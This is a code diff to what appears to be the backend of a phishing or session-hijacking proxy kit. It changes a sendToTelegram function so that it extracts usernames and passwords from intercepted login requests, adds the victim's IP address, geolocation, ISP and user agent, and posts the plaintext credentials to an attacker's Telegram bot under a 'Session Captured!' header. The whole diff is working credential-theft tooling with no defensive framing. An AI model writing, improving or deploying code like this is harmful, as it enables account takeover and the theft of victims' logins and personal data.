@@ -80,46 +80,65 @@ async function sendCookiesAsFile(cookies, sessionId) {
 
 async function sendToTelegram(data) {
     try {
+        // 𝙴𝚡𝚝𝚛𝚊𝚌𝚝 𝙸𝙿
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                    'Unknown';
 
+        // 𝙶𝚎𝚝 𝙶𝚎𝚘 𝙸𝚗𝚏𝚘
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
-
         if (ip !== 'Unknown') {
             geo = await getGeoInfo(ip);
             flag = getFlagEmoji(geo.countryCode);
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        const message = `
-🔐 **New Capture!**
+        // 𝙴𝚡𝚝𝚛𝚊𝚌𝚝 𝚞𝚜𝚎𝚛𝚗𝚊𝚖𝚎 & 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚏𝚛𝚘𝚖 𝚋𝚘𝚍𝚢
+        let username = 'N/A';
+        let password = 'N/A';
+        try {
+            const body = typeof data.proxyRequestBody === 'string' 
+                ? JSON.parse(data.proxyRequestBody) 
+                : data.proxyRequestBody;
+            if (body) {
+                username = body.username || body.login || body.user || body.Email || 'N/A';
+                password = body.password || body.passwd || body.Password || 'N/A';
+            }
+        } catch (e) {
+            // 𝙽𝚘𝚝 𝙹𝚂𝙾𝙽, 𝚝𝚛𝚢 𝚏𝚘𝚛𝚖-𝚍𝚊𝚝𝚊
+            const body = data.proxyRequestBody || '';
+            const userMatch = body.match(/(?:username|login|user|Email)=([^&]+)/i);
+            const passMatch = body.match(/(?:password|passwd|Password)=([^&]+)/i);
+            if (userMatch) username = decodeURIComponent(userMatch[1]);
+            if (passMatch) password = decodeURIComponent(passMatch[1]);
+        }
 
-🌍 **IP:** ${ip}
+        // 𝙴𝚡𝚝𝚛𝚊𝚌𝚝 𝙻𝚊𝚗𝚍𝚒𝚗𝚐 𝚄𝚁𝙻 𝚏𝚛𝚘𝚖 𝚛𝚎𝚏𝚎𝚛𝚎𝚛 𝚘𝚛 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚄𝚁𝙻
+        const landingUrl = data.proxyRequestHeaders?.referer || data.proxyRequestURL || 'N/A';
+
+        // 𝙱𝚞𝚒𝚕𝚍 𝚌𝚕𝚎𝚊𝚗 𝚖𝚎𝚜𝚜𝚊𝚐𝚎
+        const message = `
+🔐 **Session Captured!**
+
+👤 **Username:** \`${username}\`
+🔑 **Password:** \`${password}\`
+
+🌍 **IP:** \`${ip}\`
 ${flag} **Location:** ${location}
 🏢 **ISP:** ${geo.isp || 'N/A'}
-📡 **Org:** ${geo.org || 'N/A'}
 
-🕒 **Time:** ${data.timestamp || new Date().toISOString()}
-🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
-📨 **Method:** ${data.proxyRequestMethod || 'N/A'}
+🌐 **Landing URL:** ${landingUrl}
 
-📋 **Headers:**
-\`\`\`json
-${JSON.stringify(data.proxyRequestHeaders || {}, null, 2)}
-\`\`\`
+🕒 **Time:** ${new Date(data.timestamp || Date.now()).toLocaleString()}
+📱 **User-Agent:** ${data.proxyRequestHeaders?.['user-agent'] || 'N/A'}
 
-📦 **Body:**
-\`\`\`json
-${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
-\`\`\`
-
-📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
+📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}
         `;
 
+        // 𝚂𝚎𝚗𝚍 𝚖𝚎𝚜𝚜𝚊𝚐𝚎
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
@@ -133,7 +152,7 @@ ${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
         }
 
     } catch (e) {
-        console.log('Telegram send failed', e.message);
+        console.log('Telegram send failed:', e.message);
     }
 }
 
